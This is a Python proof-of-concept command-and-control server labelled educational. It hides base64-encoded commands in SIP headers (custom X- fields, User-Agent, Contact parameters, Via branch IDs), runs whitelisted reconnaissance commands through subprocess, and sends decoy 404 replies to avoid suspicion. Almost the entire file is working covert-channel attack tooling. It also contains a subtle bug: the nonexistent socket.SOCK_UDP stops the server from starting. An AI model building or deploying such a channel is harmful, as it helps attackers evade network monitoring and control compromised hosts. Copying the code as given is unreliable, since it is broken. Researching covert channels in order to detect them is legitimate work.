#!/usr/bin/env python3
"""
SIP Covert Channel C2 Server - Proof of Concept
Educational/Research Purpose Only

This server listens for SIP messages and extracts covert commands from custom headers.
Commands are base64 encoded in various SIP headers.

DISCLAIMER: This is for educational and security research purposes only.
Do not use for malicious activities. Ensure proper authorization before testing.
"""

import socket
import base64
import subprocess
import threading
import re
import logging
import sys
import argparse
import json
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO, 
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('/tmp/sip_c2_server.log')
    ]
)
logger = logging.getLogger(__name__)

class SIPCovertC2Server:
    def __init__(self, host='0.0.0.0', port=5060):
        self.host = host
        self.port = port
        self.socket = None
        self.running = False
        self.stats = {
            'total_messages': 0,
            'covert_commands': 0,
            'successful_executions': 0,
            'start_time': datetime.now()
        }
        
    def start_server(self):
        """Start the SIP server to listen for covert commands"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_UDP)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.host, self.port))
            self.running = True
            
            logger.info(f"🚀 SIP Covert C2 Server started on {self.host}:{self.port}")
            logger.info("📡 Waiting for covert commands via SIP headers...")
            logger.info(f"📊 Logging to /tmp/sip_c2_server.log")
            
            while self.running:
                try:
                    data, addr = self.socket.recvfrom(4096)
                    self.stats['total_messages'] += 1
                    
                    # Process each SIP message in a separate thread
                    thread = threading.Thread(
                        target=self.process_sip_message, 
                        args=(data.decode('utf-8', errors='ignore'), addr)
                    )
                    thread.daemon = True
                    thread.start()
                    
                except socket.error as e:
                    if self.running:
                        logger.error(f"Socket error: {e}")
                        
        except Exception as e:
            logger.error(f"Failed to start server: {e}")
            sys.exit(1)
        finally:
            self.cleanup()
    
    def process_sip_message(self, sip_data, addr):
        """Process incoming SIP message and extract covert commands"""
        try:
            logger.info(f"📨 Received SIP message from {addr[0]}:{addr[1]}")
            
            # Extract SIP headers
            headers = self.parse_sip_headers(sip_data)
            
            # Look for our covert command header
            covert_command = None
            found_header = None
            
            # Check custom headers for covert data (highest priority)
            custom_headers = ['X-Custom-Data', 'X-Session-ID', 'X-Call-Info', 'X-Covert-Channel']
            for header_name in custom_headers:
                if header_name in headers:
                    try:
                        # Decode base64 encoded command
                        encoded_cmd = headers[header_name]
                        covert_command = base64.b64decode(encoded_cmd).decode('utf-8')
                        found_header = header_name
                        logger.info(f"🔍 Found covert command in {header_name}: '{covert_command}'")
                        break
                    except Exception as e:
                        logger.debug(f"Failed to decode {header_name}: {e}")
                        
            # Alternative: Hide command in User-Agent field variations
            if not covert_command and 'User-Agent' in headers:
                covert_command = self.extract_from_user_agent(headers['User-Agent'])
                if covert_command:
                    found_header = 'User-Agent'
            
            # Alternative: Hide command in Contact header parameters
            if not covert_command and 'Contact' in headers:
                covert_command = self.extract_from_contact(headers['Contact'])
                if covert_command:
                    found_header = 'Contact'
                    
            # Alternative: Hide command in Via header branch
            if not covert_command and 'Via' in headers:
                covert_command = self.extract_from_via(headers['Via'])
                if covert_command:
                    found_header = 'Via'
            
            if covert_command:
                self.stats['covert_commands'] += 1
                logger.warning(f"🎯 COVERT COMMAND DETECTED from {addr[0]} via {found_header}")
                
                # Execute the covert command
                success = self.execute_covert_command(covert_command, addr)
                if success:
                    self.stats['successful_executions'] += 1
                
                # Send appropriate SIP response
                self.send_sip_response(addr, "200 OK", covert_command)
                
                # Log the incident
                self.log_covert_incident(covert_command, addr, found_header)
            else:
                logger.debug(f"📋 Normal SIP message from {addr[0]} - no covert data found")
                # Send normal SIP response to avoid suspicion
                self.send_sip_response(addr, "404 Not Found")
                
        except Exception as e:
            logger.error(f"❌ Error processing SIP message: {e}")
    
    def parse_sip_headers(self, sip_data):
        """Parse SIP message headers"""
        headers = {}
        lines = sip_data.split('\r\n')
        
        for line in lines:
            if ':' in line:
                header, value = line.split(':', 1)
                headers[header.strip()] = value.strip()
                
        return headers
    
    def extract_from_user_agent(self, user_agent):
        """Extract covert command from User-Agent field"""
        # Look for pattern like "FreeSWITCH-mod_sofia/1.10.7-release~64bit (cmd:base64data)"
        patterns = [
            r'cmd:([A-Za-z0-9+/=]+)',
            r'\(([A-Za-z0-9+/=]{8,})\)',  # Base64 in parentheses
            r'build:([A-Za-z0-9+/=]+)'    # Build field variation
        ]
        
        for pattern in patterns:
            match = re.search(pattern, user_agent)
            if match:
                try:
                    decoded = base64.b64decode(match.group(1)).decode('utf-8')
                    logger.info(f"🔍 Extracted command from User-Agent: '{decoded}'")
                    return decoded
                except:
                    continue
        return None
    
    def extract_from_contact(self, contact):
        """Extract covert command from Contact header parameters"""
        # Look for patterns like ";data=base64encodedcommand" or ";cmd=base64"
        patterns = [
            r'data=([A-Za-z0-9+/=]+)',
            r'cmd=([A-Za-z0-9+/=]+)',
            r'info=([A-Za-z0-9+/=]+)'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, contact)
            if match:
                try:
                    decoded = base64.b64decode(match.group(1)).decode('utf-8')
                    logger.info(f"🔍 Extracted command from Contact: '{decoded}'")
                    return decoded
                except:
                    continue
        return None
    
    def extract_from_via(self, via_header):
        """Extract covert command from Via header branch parameter"""
        # Look for branch parameter with encoded data
        pattern = r'branch=z9hG4bK([A-Za-z0-9+/=]{12,})'
        match = re.search(pattern, via_header)
        if match:
            try:
                # Skip standard branch IDs, look for base64-like content
                branch_data = match.group(1)
                if len(branch_data) > 16:  # Longer than typical branch
                    decoded = base64.b64decode(branch_data).decode('utf-8')
                    logger.info(f"🔍 Extracted command from Via branch: '{decoded}'")
                    return decoded
            except:
                pass
        return None
    
    def execute_covert_command(self, command, addr):
        """Execute the covert command safely"""
        logger.warning(f"⚡ EXECUTING covert command from {addr[0]}: '{command}'")
        
        try:
            # Simple command whitelist for safety in PoC
            safe_commands = [
                'whoami', 'pwd', 'ls', 'date', 'uname -a', 'id', 
                'hostname', 'uptime', 'df -h', 'free -h', 'ps aux'
            ]
            
            if command in safe_commands:
                result = subprocess.run(
                    command.split(), 
                    capture_output=True, 
                    text=True, 
                    timeout=10
                )
                output = result.stdout + result.stderr
                logger.info(f"✅ Command executed successfully:")
                logger.info(f"📄 Output: {output.strip()}")
                
                # In a real scenario, you might exfiltrate this data
                # back through another covert channel
                return True
                
            elif command.startswith('echo '):
                # Safe echo command
                text = command[5:]
                result = subprocess.run(['echo', text], capture_output=True, text=True)
                logger.info(f"✅ Echo output: {result.stdout.strip()}")
                return True
                
            elif command == 'status':
                uptime = datetime.now() - self.stats['start_time']
                logger.info(f"📊 C2 Server Status:")
                logger.info(f"   Uptime: {uptime}")
                logger.info(f"   Total messages: {self.stats['total_messages']}")
                logger.info(f"   Covert commands: {self.stats['covert_commands']}")
                logger.info(f"   Successful executions: {self.stats['successful_executions']}")
                return True
                
            else:
                logger.warning(f"⚠️  Command not in whitelist: '{command}'")
                logger.info(f"🛡️  Allowed commands: {safe_commands}")
                return False
                
        except subprocess.TimeoutExpired:
            logger.error("⏱️  Command execution timed out")
            return False
        except Exception as e:
            logger.error(f"❌ Error executing command: {e}")
            return False
    
    def send_sip_response(self, addr, response_code, command=None):
        """Send SIP response back to sender"""
        # Create realistic SIP response
        call_id = f"covert-{datetime.now().timestamp()}"
        
        if "200 OK" in response_code and command:
            # Success response with hidden acknowledgment
            response = f"""SIP/2.0 200 OK
Via: SIP/2.0/UDP {addr[0]}:{addr[1]};rport={addr[1]};received={addr[0]}
From: <sip:server@{self.host}>
To: <sip:client@{addr[0]}>
Call-ID: {call_id}
CSeq: 1 OPTIONS
Contact: <sip:server@{self.host}:{self.port}>
Content-Length: 0

"""
        else:
            # Standard response
            response = f"""SIP/2.0 {response_code}
Via: SIP/2.0/UDP {addr[0]}:{addr[1]}
From: <sip:server@{self.host}>
To: <sip:client@{addr[0]}>
Call-ID: {call_id}
CSeq: 1 OPTIONS
Content-Length: 0

"""
        
        try:
            self.socket.sendto(response.encode(), addr)
            logger.debug(f"📤 Sent SIP response: {response_code}")
        except Exception as e:
            logger.error(f"❌ Failed to send SIP response: {e}")
    
    def log_covert_incident(self, command, addr, header_type):
        """Log covert channel incident for analysis"""
        incident = {
            'timestamp': datetime.now().isoformat(),
            'source_ip': addr[0],
            'source_port': addr[1],
            'command': command,
            'header_type': header_type,
            'server_host': self.host,
            'server_port': self.port,
            'incident_type': 'covert_command_execution'
        }
        
        try:
            with open('/tmp/sip_covert_incidents.json', 'a') as f:
                f.write(json.dumps(incident) + '\n')
            logger.info(f"📝 Incident logged to /tmp/sip_covert_incidents.json")
        except Exception as e:
            logger.error(f"❌ Failed to log incident: {e}")
    
    def display_stats(self):
        """Display server statistics"""
        uptime = datetime.now() - self.stats['start_time']
        print(f"""
📊 SIP Covert C2 Server Statistics:
════════════════════════════════════
🕐 Uptime: {uptime}
📨 Total SIP messages: {self.stats['total_messages']}
🎯 Covert commands detected: {self.stats['covert_commands']}
✅ Successful executions: {self.stats['successful_executions']}
🔧 Server: {self.host}:{self.port}
""")
    
    def cleanup(self):
        """Cleanup resources"""
        self.running = False
        if self.socket:
            self.socket.close()
        
        logger.info("🛑 SIP Covert C2 Server stopped")
        self.display_stats()

def main():
    print("""
╔══════════════════════════════════════════════════════════════╗
║                 SIP Covert Channel C2 Server                ║
║                  Educational Use Only                        ║
╚══════════════════════════════════════════════════════════════╝

This server acts as a covert C2 by extracting commands hidden
in SIP protocol headers and executing them safely.

DISCLAIMER: For educational and security research purposes only.
""")
    
    parser = argparse.ArgumentParser(description='SIP Covert Channel C2 Server')
    parser.add_argument('--host', default='0.0.0.0', 
                       help='Host to bind to (default: 0.0.0.0)')
    parser.add_argument('--port', type=int, default=5060,
                       help='Port to listen on (default: 5060)')
    parser.add_argument('--verbose', '-v', action='store_true',
                       help='Enable verbose logging')
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Create and start server
    server = SIPCovertC2Server(host=args.host, port=args.port)
    
    try:
        server.start_server()
    except KeyboardInterrupt:
        print("\n🛑 Shutting down server...")
        server.cleanup()
    except Exception as e:
        logger.error(f"❌ Server error: {e}")
        server.cleanup()
        sys.exit(1)

if __name__ == "__main__":
    main()